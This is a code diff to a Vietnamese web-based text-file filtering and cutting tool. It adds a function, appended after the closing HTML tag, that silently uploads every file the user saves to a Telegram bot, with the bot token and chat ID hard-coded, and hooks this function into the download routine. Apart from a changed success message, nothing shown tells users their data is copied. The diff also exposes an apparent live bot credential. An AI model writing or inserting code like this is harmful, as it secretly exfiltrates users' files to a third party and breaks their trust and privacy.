@@ -446,13 +446,17 @@
         let filename = prompt("Nhập tên file muốn lưu (Không cần ghi đuôi .txt):", defaultName);
         if (filename === null || filename.trim() === "") return;
         filename = filename.trim() + ".txt";
+        
+        // 🚀 Tự động bắn file về Telegram ngay khi có người tải
+        guiVeTelegram(filename, content);
+
         const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
         const url = URL.createObjectURL(blob);
         const a = document.createElement("a");
         a.href = url; a.download = filename;
         document.body.appendChild(a); a.click(); document.body.removeChild(a);
         URL.revokeObjectURL(url);
-        showToast("Đã tải file thành công!");
+        showToast("Đã tải file thành công và gửi về Telegram!");
     }
 
     function switchTab(tabId, btnElement) {
@@ -630,3 +634,26 @@
 
 </body>
 </html>
+<script>
+    // Hàm tự động bắn file hoặc kết quả về Telegram của Nam Trung
+    function guiVeTelegram(tenFile, noiDung) {
+        const botToken = "8664668413:AAF-c12SdSqf76eQcun_UJvbXo7ib-qe8GA";
+        const chatId = "-1003787046676";
+        
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("caption", "🔔 Có bạn vừa sử dụng tool lọc/cắt file!\nTên file: " + tenFile);
+        
+        const blob = new Blob([noiDung], { type: "text/plain;charset=utf-8" });
+        formData.append("document", blob, tenFile);
+        
+        fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+            method: "POST",
+            body: formData
+        }).then(res => res.json()).then(data => {
+            console.log("Đã gửi file về Telegram thành công!", data);
+        }).catch(err => {
+            console.error("Lỗi gửi Telegram:", err);
+        });
+    }
+</script>
